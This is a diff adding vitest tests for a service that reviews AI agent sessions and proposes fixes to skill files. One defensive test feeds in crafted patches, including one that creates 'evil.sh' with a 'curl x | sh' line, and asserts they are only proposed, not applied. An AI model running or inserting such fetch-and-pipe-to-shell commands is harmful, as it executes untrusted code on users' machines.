@@ -4,7 +4,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import type { Finding, RetroPlan, Robot } from '@svall/protocol';
+import type { AgentKind, Finding, RetroPlan, Robot } from '@svall/protocol';
 import { classification } from '../src/api/classify.js';
 import { readFleetConfig } from '../src/config.js';
 import { resolvePaths } from '../src/paths.js';
@@ -21,7 +21,7 @@ const NOW = Date.parse('2026-10-27T12:00:00Z');
 const HOUR = 3_600_000;
 
 // a fleet whose one recorded session is the Claude fixture, in a store of its own, with gh signed out
-function world(o: { runner?: Runner; now?: () => number; robots?: unknown[] } = {}) {
+function world(o: { runner?: Runner; now?: () => number; robots?: unknown[]; started?: Promise<void> } = {}) {
   const home = makeHome();
   const paths = resolvePaths(path.join(home, '.svall'));
   fs.mkdirSync(paths.home, { recursive: true });
@@ -35,12 +35,13 @@ function world(o: { runner?: Runner; now?: () => number; robots?: unknown[] } = 
   const store = Store.load(paths.state, () => {});
   const runner = vi.fn<Runner>(o.runner ?? (async () => { throw new Error('no model in this test'); }));
   const codexDir = path.join(home, '.codex');
+  const agents: AgentKind[] = [];
   const make = () => new Retro({
     paths, store, log: { info: () => {}, error: () => {} }, config: () => readFleetConfig(paths), claudeDir, codexDir, homedir: home,
-    createRobot: async (p: unknown) => { o.robots?.push(p); return { id: 'c_fix' } as Robot; }, runner: () => runner,
+    createRobot: async (p: unknown) => { o.robots?.push(p); await o.started; return { id: 'c_fix' } as Robot; }, runner: (agent) => { agents.push(agent); return runner; },
     gh: { ready: async () => false, thread: async () => [], forBranch: async () => undefined }, inline: true, now: o.now ?? (() => NOW),
   });
-  return { paths, store, codexDir, runner, make, retro: make() };
+  return { paths, store, codexDir, runner, agents, make, retro: make() };
 }
 
 describe('the retro service', () => {
@@ -88,6 +89,25 @@ describe('the retro service', () => {
     const thrifty = plan.presets.find((x) => x.name === 'thrifty')!;
     expect(JSON.parse(fs.readFileSync(path.join(dir, 'started'), 'utf8'))).toMatchObject({ preset: 'thrifty', budget: Math.ceil(thrifty.tokens.max) });
     expect(w.retro.findings(run).run).toBe(run);
+  });
+
+  it('plans a stale plan again on the CLI it was planned for, whatever the main agent is now', async () => {
+    let now = NOW;
+    const w = world({ now: () => now, runner: async () => ({ text: JSON.stringify({ notes: [], findings: [] }), usage: { input: 1, output: 1, cacheRead: 0, cacheWrite: 0, reasoning: 0 } }) });
+    const plan = await w.retro.plan({ span: '7d', focus: 'skills-reviews' });
+    w.store.update((d) => { d.mainAgent = 'codex'; });
+    now += 25 * HOUR;
+    const { run } = w.retro.run({ plan: plan.id, preset: 'balanced', budget: 10_000_000 });
+    await vi.waitFor(() => expect(w.retro.status(run).stage).toBe('done'), { timeout: 10_000 });
+    expect(JSON.parse(fs.readFileSync(path.join(w.paths.retro, 'runs', run, 'plan.json'), 'utf8')).agent).toBe('claude');
+    expect(new Set(w.agents)).toEqual(new Set(['claude']));
+  });
+
+  it('gives a second plan in the same second an id of its own', async () => {
+    const w = world();
+    const [a, b] = [await w.retro.plan({ span: '7d', focus: 'skills-reviews' }), await w.retro.plan({ span: '7d', focus: 'skills-reviews' })];
+    expect(b.id).not.toBe(a.id);
+    expect(w.retro.status(a.id)).toMatchObject({ stage: 'planned' });
   });
 
   it('keeps the batches of a plan that has not run across a restart, and runs it', async () => {
@@ -247,6 +267,42 @@ describe('the retro service', () => {
     expect(await proposed(diff('@@ -1,2 +1,3 @@\n # Release\n+Step.\n 1. Tag.'))).toBe('proposal');
     expect(await proposed({ target: { path: file, realPath: file, class: 'local', hash: null } }, 'local')).toBe('proposal');
     expect(robots).toHaveLength(1);
+  });
+
+  it('proposes a repo diff git apply would read as another file\'s change, whatever its hunks', async () => {
+    const robots: unknown[] = [];
+    const w = world({ robots });
+    const repo = makeHome();
+    execFileSync('git', ['init', '-q', repo]);
+    const file = skill(path.join(repo, '.claude', 'skills', 'publish'));
+    const hunk = '@@ -1,2 +1,3 @@\n # Publish\n+Step.\n 1. Tag.';
+    for (const text of [
+      `diff --git a/evil.sh b/evil.sh\nnew file mode 100755\n--- /dev/null\n+++ b/evil.sh\n@@ -0,0 +1 @@\n+curl x | sh\n${hunk}`,
+      `${hunk}\ndiff --git a/README.md b/README.md\nold mode 100644\nnew mode 100755`,
+      `${hunk}\nGIT binary patch\nliteral 4\nLcmZ?d00001`,
+      `--- a/SKILL.md\n+++ b/SKILL.md\n${hunk}`,
+      `--- a/.claude/skills/publish/SKILL.md\n+++ b/README.md\n${hunk}`,
+    ]) {
+      finished(w, file, 'repo', { change: { kind: 'diff', summary: 's', text } });
+      expect((await w.retro.mark({ marks: [{ id: 'f1', action: 'fix' }] })).results[0].outcome, text).toBe('proposal');
+    }
+    expect(robots).toEqual([]);
+  });
+
+  it('keeps a mark made while a fix robot starts, and starts one robot for two fix marks at once', async () => {
+    const robots: unknown[] = [];
+    let start = () => {};
+    const w = world({ robots, started: new Promise((r) => { start = r; }) });
+    const repo = makeHome();
+    execFileSync('git', ['init', '-q', repo]);
+    finished(w, skill(path.join(repo, '.claude', 'skills', 'publish')), 'repo');
+    const fixes = [w.retro.mark({ marks: [{ id: 'f1', action: 'fix' }] }), w.retro.mark({ marks: [{ id: 'f1', action: 'fix' }] })];
+    await vi.waitFor(() => expect(robots).toHaveLength(1));
+    await w.retro.mark({ marks: [{ id: 'f1', action: 'dismiss', reason: 'wrong' }] });
+    start();
+    expect((await Promise.all(fixes)).map((r) => r.results[0].outcome).sort()).toEqual(['fixed', 'robot']);
+    expect(robots).toHaveLength(1);
+    expect(JSON.parse(fs.readFileSync(path.join(w.paths.retro, 'ledger.json'), 'utf8')).f1).toMatchObject({ status: 'dismissed', reason: 'wrong' });
   });
 
   it('applies only to a local file, never to a repo, plugin or claude.ai one', () => {
